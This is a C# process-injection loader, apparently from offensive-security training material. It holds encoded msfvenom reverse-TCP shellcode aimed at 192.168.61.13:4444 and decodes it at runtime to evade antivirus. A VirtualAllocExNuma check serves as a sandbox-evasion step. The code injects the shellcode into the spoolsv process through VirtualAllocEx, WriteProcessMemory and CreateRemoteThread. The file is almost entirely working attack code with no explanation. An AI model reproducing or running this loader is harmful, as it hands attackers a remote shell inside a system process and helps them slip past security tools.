
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
namespace ProcessInjection
{
    class Program
    {

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        private static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentProcess();




        static void Main(string[] args)
        {
            Console.WriteLine("A");

            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }

            //msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.61.13 LPORT=4444 -f csharp
            byte[] buf = new byte[460] { 0x01, 0x4d, 0x88, 0xe9, 0xf5, 0xed, 0xc5, 0x05, 0x05, 0x05, 0x46, 0x56, 0x46, 0x55, 0x57, 0x56, 0x5b, 0x4d, 0x36, 0xd7, 0x6a, 0x4d, 0x90, 0x57, 0x65, 0x4d, 0x90, 0x57, 0x1d, 0x4d, 0x90, 0x57, 0x25, 0x4d, 0x90, 0x77, 0x55, 0x4d, 0x14, 0xbc, 0x4f, 0x4f, 0x52, 0x36, 0xce, 0x4d, 0x36, 0xc5, 0xb1, 0x41, 0x66, 0x81, 0x07, 0x31, 0x25, 0x46, 0xc6, 0xce, 0x12, 0x46, 0x06, 0xc6, 0xe7, 0xf2, 0x57, 0x46, 0x56, 0x4d, 0x90, 0x57, 0x25, 0x90, 0x47, 0x41, 0x4d, 0x06, 0xd5, 0x90, 0x85, 0x8d, 0x05, 0x05, 0x05, 0x4d, 0x8a, 0xc5, 0x79, 0x6c, 0x4d, 0x06, 0xd5, 0x55, 0x90, 0x4d, 0x1d, 0x49, 0x90, 0x45, 0x25, 0x4e, 0x06, 0xd5, 0xe8, 0x5b, 0x4d, 0x04, 0xce, 0x46, 0x90, 0x39, 0x8d, 0x4d, 0x06, 0xdb, 0x52, 0x36, 0xce, 0x4d, 0x36, 0xc5, 0xb1, 0x46, 0xc6, 0xce, 0x12, 0x46, 0x06, 0xc6, 0x3d, 0xe5, 0x7a, 0xf6, 0x51, 0x08, 0x51, 0x29, 0x0d, 0x4a, 0x3e, 0xd6, 0x7a, 0xdd, 0x5d, 0x49, 0x90, 0x45, 0x29, 0x4e, 0x06, 0xd5, 0x6b, 0x46, 0x90, 0x11, 0x4d, 0x49, 0x90, 0x45, 0x21, 0x4e, 0x06, 0xd5, 0x46, 0x90, 0x09, 0x8d, 0x4d, 0x06, 0xd5, 0x46, 0x5d, 0x46, 0x5d, 0x63, 0x5e, 0x5f, 0x46, 0x5d, 0x46, 0x5e, 0x46, 0x5f, 0x4d, 0x88, 0xf1, 0x25, 0x46, 0x57, 0x04, 0xe5, 0x5d, 0x46, 0x5e, 0x5f, 0x4d, 0x90, 0x17, 0xee, 0x5c, 0x04, 0x04, 0x04, 0x62, 0x4e, 0xc3, 0x7c, 0x78, 0x37, 0x64, 0x38, 0x37, 0x05, 0x05, 0x46, 0x5b, 0x4e, 0x8e, 0xeb, 0x4d, 0x86, 0xf1, 0xa5, 0x06, 0x05, 0x05, 0x4e, 0x8e, 0xea, 0x4e, 0xc1, 0x07, 0x05, 0x16, 0x61, 0xc5, 0xad, 0x42, 0x12, 0x46, 0x59, 0x4e, 0x8e, 0xe9, 0x51, 0x8e, 0xf6, 0x46, 0xbf, 0x51, 0x7c, 0x2b, 0x0c, 0x04, 0xda, 0x51, 0x8e, 0xef, 0x6d, 0x06, 0x06, 0x05, 0x05, 0x5e, 0x46, 0xbf, 0x2e, 0x85, 0x70, 0x05, 0x04, 0xda, 0x55, 0x55, 0x52, 0x36, 0xce, 0x52, 0x36, 0xc5, 0x4d, 0x04, 0xc5, 0x4d, 0x8e, 0xc7, 0x4d, 0x04, 0xc5, 0x4d, 0x8e, 0xc6, 0x46, 0xbf, 0xef, 0x14, 0xe4, 0xe5, 0x04, 0xda, 0x4d, 0x8e, 0xcc, 0x6f, 0x15, 0x46, 0x5d, 0x51, 0x8e, 0xe7, 0x4d, 0x8e, 0xfe, 0x46, 0xbf, 0x9e, 0xaa, 0x79, 0x66, 0x04, 0xda, 0x4d, 0x86, 0xc9, 0x45, 0x07, 0x05, 0x05, 0x4e, 0xbd, 0x68, 0x72, 0x69, 0x05, 0x05, 0x05, 0x05, 0x05, 0x46, 0x55, 0x46, 0x55, 0x4d, 0x8e, 0xe7, 0x5c, 0x5c, 0x5c, 0x52, 0x36, 0xc5, 0x6f, 0x12, 0x5e, 0x46, 0x55, 0xe7, 0x01, 0x6b, 0xcc, 0x49, 0x29, 0x59, 0x06, 0x06, 0x4d, 0x92, 0x49, 0x29, 0x1d, 0xcb, 0x05, 0x6d, 0x4d, 0x8e, 0xeb, 0x5b, 0x55, 0x46, 0x55, 0x46, 0x55, 0x46, 0x55, 0x4e, 0x04, 0xc5, 0x46, 0x55, 0x4e, 0x04, 0xcd, 0x52, 0x8e, 0xc6, 0x51, 0x8e, 0xc6, 0x46, 0xbf, 0x7e, 0xd1, 0x44, 0x8b, 0x04, 0xda, 0x4d, 0x36, 0xd7, 0x4d, 0x04, 0xcf, 0x90, 0x13, 0x46, 0xbf, 0x0d, 0x8c, 0x22, 0x65, 0x04, 0xda, 0xc0, 0xf5, 0xba, 0xa7, 0x5b, 0x46, 0xbf, 0xab, 0x9a, 0xc2, 0xa2, 0x04, 0xda, 0x4d, 0x88, 0xc9, 0x2d, 0x41, 0x0b, 0x81, 0x0f, 0x85, 0x00, 0xe5, 0x7a, 0x0a, 0xc0, 0x4c, 0x18, 0x77, 0x74, 0x6f, 0x05, 0x5e, 0x46, 0x8e, 0xdf, 0x04, 0xda };

            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(((uint)buf[i] - 5) & 0xFF);
            }

            int size = buf.Length;


            Process[] expProc = Process.GetProcessesByName("spoolsv");
            int pid = expProc[0].Id;

            IntPtr hProcess = OpenProcess(0x001FFFFF, false, pid);

            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);

            IntPtr outSize;
            WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);


            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);


            Console.WriteLine(hThread);

            Console.WriteLine("B");
        }
    }
}
